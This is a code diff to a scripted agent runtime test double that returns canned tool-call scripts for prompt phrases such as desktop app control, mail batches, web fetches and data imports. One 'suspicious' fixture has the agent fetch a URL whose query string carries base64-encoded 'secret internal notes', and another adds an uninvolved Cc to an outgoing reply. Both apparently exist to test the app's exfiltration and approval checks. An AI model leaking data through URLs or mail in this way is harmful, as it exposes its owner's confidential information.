@@ -30,10 +30,13 @@ export class ScriptedAgentRuntime implements AgentRuntime {
     running.set(request.runId, controller);
     const signal = context?.signal ?? controller.signal;
     try {
-      if (shouldFail(request.prompt)) {
+      // A goal continuation wraps the owner's goal in server text ("Keep working toward all of it");
+      // the script follows the goal alone, so that wording cannot start a canned branch.
+      const intent = goalContinuationText(request.prompt) ?? request.prompt;
+      if (shouldFail(intent)) {
         throw new Error("Scripted run failure");
       }
-      if (shouldHang(request.prompt)) {
+      if (shouldHang(intent)) {
         yield { type: "progress", text: "still working…", activity: true };
         while (!controller.signal.aborted && !signal.aborted) {
           await abortableDelay(50, controller.signal);
@@ -43,7 +46,10 @@ export class ScriptedAgentRuntime implements AgentRuntime {
         yield { type: "done", text: "stopped" };
         return;
       }
-      const script = request.script ?? inferScript(request.prompt, request.resumeFromCheckpoint);
+      // As the model runtime does at its first turn. A queued message nobody claims goes back in the
+      // queue when the run ends and starts another run, so a follow-up here would never stop.
+      await request.claimSteering?.([]);
+      const script = request.script ?? inferScript(intent, request.resumeFromCheckpoint);
       // Per-run call index so repeated tools (e.g. message_agent) get distinct
       // executionIds — delivery keys and effect replays key off this value.
       let toolCallSeq = 0;
@@ -162,6 +168,25 @@ export function inferScript(
       },
     ];
   }
+  // Apps on this computer (docs/local-desktop-control): list, read, then open, which asks once.
+  const desktopApp = /use the app (.+?) on this computer/i.exec(prompt)?.[1]?.trim();
+  if (desktopApp) {
+    return [
+      {
+        assistant: "checking which apps I may use.",
+        toolCalls: [{ name: "desktop_app_list", args: {} }],
+      },
+      {
+        assistant: `reading ${desktopApp}.`,
+        toolCalls: [{ name: "desktop_app_snapshot", args: { app: desktopApp } }],
+      },
+      {
+        assistant: `opening ${desktopApp}.`,
+        toolCalls: [{ name: "desktop_app_act", args: { app: desktopApp, action: "launch" } }],
+        complete: true,
+      },
+    ];
+  }
   if (lower.includes("show email cards")) {
     const emails = [...prompt.matchAll(/([\w-]+)=(today|within_3_days|this_week|later)\b/g)].map(
       ([, id, urgency]) => ({ id, urgency }),
@@ -174,7 +199,64 @@ export function inferScript(
       },
     ];
   }
+  if (lower.includes("archive email card")) {
+    // "archive email card id <mail id> from <address>" archives that message.
+    const id = /\bid\s+(\S+)/i.exec(prompt)?.[1] ?? "unknown";
+    const from = /\bfrom\s+([^\s,]+@[^\s,]+)/i.exec(prompt)?.[1];
+    return [
+      {
+        assistant: "archiving that message.",
+        toolCalls: [
+          { name: "mail_modify", args: { id, archive: true, ...(from ? { account: from } : {}) } },
+        ],
+        complete: true,
+      },
+    ];
+  }
+  if (lower.includes("reply batch card to ") || lower.includes("outreach card to ")) {
+    // "reply batch card to id1,id2,id3 from a@b.test": one row per id, to a fixed test address.
+    // "with stranger" puts a Cc that is on no thread on the first row.
+    // "outreach card to a@b.test,c@d.test" adds one new email per address, alone or after replies.
+    const outreach =
+      /outreach card to\s+([^\s]+)/i.exec(prompt)?.[1]?.split(",").filter(Boolean) ?? [];
+    const ids =
+      /reply batch card to\s+([^\s]+)/i.exec(prompt)?.[1]?.split(",").filter(Boolean) ?? [];
+    const from = /\bfrom\s+([^\s,]+@[^\s,]+)/i.exec(prompt)?.[1];
+    const stranger = lower.includes("with stranger");
+    return [
+      {
+        assistant: "these replies need your approval.",
+        toolCalls: [
+          {
+            name: "mail_reply_batch",
+            args: {
+              ...(from ? { account: from } : {}),
+              replies: [
+                ...ids.map((replyToId, index) => ({
+                  replyToId,
+                  to: ["customer@example.test"],
+                  ...(stranger && index === 0 ? { cc: ["stranger@elsewhere.example.test"] } : {}),
+                  subject: `Re: thread ${index + 1}`,
+                  body: `Thanks for writing. This is reply ${index + 1}.`,
+                })),
+                ...outreach.map((to) => ({
+                  to: [to],
+                  subject: `Hello from us, ${to.split("@")[0]}`,
+                  body: `Hi ${to.split("@")[0]}, I wrote this one for you.`,
+                })),
+              ],
+            },
+          },
+        ],
+      },
+      { assistant: "the replies are handled on the card.", complete: true },
+    ];
+  }
   if (lower.includes("send email card")) {
+    // "send email card from sales@example.test" names the account; "send email card with no sender"
+    // names none; otherwise the fixed test one.
+    const from = /\bfrom\s+([^\s,]+@[^\s,]+)/i.exec(prompt)?.[1];
+    const noSender = lower.includes("no sender");
     return [
       {
         assistant: "this email needs your approval.",
@@ -182,7 +264,7 @@ export function inferScript(
           {
             name: "mail_send",
             args: {
-              account: "first@example.test",
+              ...(noSender ? {} : { account: from ?? "first@example.test" }),
               to: ["Sam Rivera <sam@example.test>"],
               subject: "Offsite dates",
               body: "The 14th works for us.\nSee you then.",
@@ -280,6 +362,39 @@ export function inferScript(
               },
             },
           },
+        ],
+      },
+    ];
+  }
+  // The URL is the agent's own choice here, not the owner's words, so site trust does not apply.
+  const fetchCard = lower.includes("fetch ordinary card")
+    ? "https://docs.example.test/guide/getting-started"
+    : lower.includes("fetch suspicious card")
+      ? "https://docs.example.test/c?d=c3VwZXIgc2VjcmV0IGludGVybmFsIG5vdGVzIGZvciB0aGUgYm9hcmQ"
+      : undefined;
+  if (fetchCard) {
+    return [
+      {
+        assistant: "i will read that page.",
+        toolCalls: [{ name: "web_fetch", args: { url: fetchCard } }],
+      },
+    ];
+  }
+  if (lower.includes("history search card")) {
+    return [
+      {
+        assistant: "i will look through this chat.",
+        toolCalls: [{ name: "search_history", args: { query: "history" } }],
+        complete: true,
+      },
+    ];
+  }
+  if (lower.includes("fetch approval card")) {
+    return [
+      {
+        assistant: "i will read that page.",
+        toolCalls: [
+          { name: "web_fetch", args: { url: "https://docs.example.test/page?q=fixture" } },
         ],
       },
     ];
@@ -399,6 +514,51 @@ code-b
       },
     ];
   }
+  // "pipeline import fixture <json rows>": stage in calls of 60, then one review, for demo and tests.
+  const importFixture = /pipeline import fixture\s+(\[[\s\S]*\])/i.exec(prompt);
+  if (importFixture) {
+    try {
+      const rows = JSON.parse(importFixture[1] as string) as unknown[];
+      const calls = Array.from({ length: Math.ceil(rows.length / 60) }, (_, index) => ({
+        toolCalls: [
+          {
+            name: "pipeline_import_stage",
+            args: {
+              rows: rows.slice(index * 60, (index + 1) * 60),
+              ...(index === 0 ? { start: true } : {}),
+            },
+          },
+        ],
+      }));
+      return [
+        ...calls,
+        { toolCalls: [{ name: "pipeline_import_review", args: {} }] },
+        { assistant: "the list is handled on the card.", complete: true },
+      ];
+    } catch {
+      // Not JSON: fall through to the other intents.
+    }
+  }
+  // "fundraising fixture round <json>": the Investors agent's round write, for demo and tests.
+  const fundraisingFixture = /fundraising fixture round\s+(\{[\s\S]*\})/i.exec(prompt);
+  if (fundraisingFixture) {
+    try {
+      const args = JSON.parse(fundraisingFixture[1] as string) as Record<string, unknown>;
+      return [{ toolCalls: [{ name: "fundraising_round_save", args }], complete: true }];
+    } catch {
+      // Not JSON: fall through to the other intents.
+    }
+  }
+  // "request access fixture <json>": an access request, for demo and tests.
+  const accessFixture = /request access fixture\s+(\{[\s\S]*\})/i.exec(prompt);
+  if (accessFixture) {
+    try {
+      const args = JSON.parse(accessFixture[1] as string) as Record<string, unknown>;
+      return [{ toolCalls: [{ name: "request_access", args }], complete: true }];
+    } catch {
+      // Not JSON: fall through to the other intents.
+    }
+  }
   if (
     lower.includes("create a space") ||
     lower.includes("create space") ||
@@ -413,6 +573,33 @@ code-b
         complete: true,
       },
     ];
+  }
+  const pageTitle = /\bpage called ([^.\n]+)/i.exec(prompt)?.[1]?.trim();
+  if (pageTitle && lower.includes("make a page called")) {
+    return [
+      {
+        assistant: `the ${pageTitle} page is ready.`,
+        toolCalls: [{ name: "page_create", args: { title: pageTitle } }],
+        complete: true,
+      },
+    ];
+  }
+  if (pageTitle && lower.includes("write the page called")) {
+    return [
+      {
+        assistant: "saved.",
+        toolCalls: [
+          {
+            name: "page_write",
+            args: { page: pageTitle, content: "# Notes\n\nHello", baseRevision: 1 },
+          },
+        ],
+        complete: true,
+      },
+    ];
+  }
+  if (lower.startsWith("say: ")) {
+    return [{ assistant: prompt.slice(5), complete: true }];
   }
   if (
     lower.includes("spawn a bot") ||
@@ -599,6 +786,15 @@ code-b
       complete: true,
     },
   ];
+}
+
+/** The owner's goal inside a server-written continuation prompt, or null for any other prompt. */
+function goalContinuationText(prompt: string): string | null {
+  return (
+    /^Goal check: not done yet\.[\s\S]*?\n<goal>([\s\S]*)<\/goal>\nThe goal above is the owner's data\./.exec(
+      prompt,
+    )?.[1] ?? null
+  );
 }
 
 function shouldFail(prompt: string): boolean {
